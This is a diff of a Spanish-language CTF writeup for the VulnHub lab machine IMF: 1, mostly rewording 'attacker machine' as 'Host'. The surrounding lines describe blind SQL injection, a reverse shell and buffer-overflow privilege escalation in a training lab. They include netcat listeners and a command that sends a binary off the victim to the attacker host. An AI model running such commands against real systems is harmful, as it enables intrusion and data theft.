@@ -17,7 +17,7 @@ references:
 
 **IMF: 1** es una máquina ***Boot2Root*** de dificultad moderada alojada en [VulnHub](https://www.vulnhub.com/), diseñada para **simular** el entorno de una agencia de inteligencia ficticia ("Impossible Mission Force"). A diferencia de los CTF tradicionales, el reto destaca por integrar múltiples flags progresivas, donde cada una revela la pista necesaria para la siguiente etapa.
 
- Este writeup documenta el proceso de auditoría completo, desde el reconocimiento inicial hasta la explotación de binarios en bajo nivel. El vector de ataque comienza con la enumeración web para descubrir puntos de entrada ocultos, evoluciona a través de una inyección SQL ciega basada en booleanos (Boolean-Based SQLi) para la exfiltración de credenciales, y culmina en el análisis de un servicio personalizado vulnerable a **Buffer Overflow**, permitiendo la ejecución remota de código y la escalada final de privilegios.
+ Este writeup documenta el proceso de auditoría completo, desde el reconocimiento inicial hasta la explotación de binarios en bajo nivel. La auditoria comienza con la enumeración web para descubrir puntos de entrada ocultos, evoluciona a través de una inyección **SQLi Boolean-Based Blind** para la exfiltración de credenciales, y culmina en el análisis de un servicio personalizado vulnerable a **Buffer Overflow**, permitiendo la ejecución remota de código y la escalada final de privilegios.
  
 ---
 ## Objetivos
@@ -78,7 +78,7 @@ La fase de **reconocimiento** es el cimiento de cualquier pentest exitoso. Duran
 Sin reconocimiento adecuado, **disparamos a la oscuridad**. Con él, nos movemos con precisión quirúrgica.
 ### 1.1 Fase Inicial | arp-scan y tcping
 
-Lo primero que hago es reconocer qué máquina voy a atacar. Para ello, debo identificar la IP de la máquina víctima, esto se hace con ayuda de la herramienta `arp-scan`.
+Lo primero que hago es reconocer qué máquina vamos a reconocer. Para ello, debo identificar la IP de la máquina víctima, esto se hace con ayuda de la herramienta `arp-scan`.
 
 **¿Qué es ARP?** Address Resolution Protocol (ARP) es un protocolo que mapea direcciones IP a direcciones MAC en una red local. Cuando una máquina quiere comunicarse con otra en la misma red, primero necesita saber su dirección MAC. ARP hace exactamente eso.
 
@@ -496,10 +496,10 @@ echo "YWdlbnRzZXJ2aWNlcw==" | base64 -d; echo
 
 Con RCE confirmado, procedemos a obtener una reverse shell interactiva.
 
-**Paso 1: Preparar la máquina atacante para escuchar**
+**Paso 1: Preparar la máquina Host para escuchar**
 
 ```bash
-# En la máquina atacante (Kali)
+# En la máquina Host
 nc -lvnp 443
 ```
 
@@ -619,20 +619,20 @@ Ejecutamos el binario del agent:
 El binario nos presentará opciones. Seleccionamos opción 3 para explotar el buffer overflow.
 ### 6.5 Traer el equipo a la maquina
 
-Necesitamos trabajar con el binario en nuestra máquina atacante para analizarlo mejor. Podemos apoyarnos de le herramienta netcat para esto:
+Necesitamos trabajar con el binario en nuestra máquina host para analizarlo mejor. Podemos apoyarnos de le herramienta netcat para esto:
 
 **En la máquina víctima (con shell):**
 ```
 nc 172.16.23.1 443 < agent
 ```
 
-**En la máquina atacante **
+**En la máquina Host **
 ```
 sudo nc -nlvp 443 > agent
 ```
 
 ![[IMF-49.webp]]
-De esta forma, podemos usar trabajar con todos nuestros juguetes con el binario, sin necesidad de depender de los paquetes que tenga la máquina victima.
+De esta forma, podemos usar trabajar con todos nuestros juguetes con el binario, sin necesidad de depender de los paquetes que tenga la máquina objetivo.
 
 ---
 ## 7. Explotación Buffer Overflow
@@ -875,7 +875,7 @@ nmap -p7788 172.16.23.129
 
 **Paso 2: Preparar Escucha**
 
-En la máquina atacante preparamos netcat para escuchar:
+En la máquina Host preparamos netcat para escuchar:
 
 ```bash
 nc -lvnp 443
